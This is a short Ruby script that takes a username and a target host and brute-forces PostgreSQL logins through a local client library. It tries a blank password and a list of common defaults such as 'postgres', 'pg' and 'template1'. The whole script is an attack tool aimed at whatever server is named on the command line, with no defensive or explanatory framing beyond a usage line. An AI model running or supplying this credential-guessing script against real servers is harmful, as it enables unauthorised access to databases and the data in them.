#!/usr/bin/env ruby

$:.unshift File.expand_path("../lib")
require 'postgres_client'

user = ARGV[0]
host = ARGV[1]

unless ARGV[1]
	puts "Usage: #{$0} username targethost"
	exit 1
end

client = PostgresClient.new(:timeout => 1)
client.host = host
client.user = user
client.passlist = %w{pg postgres postgres1 template1 default}
client.passlist.unshift ""
client.bruteforce
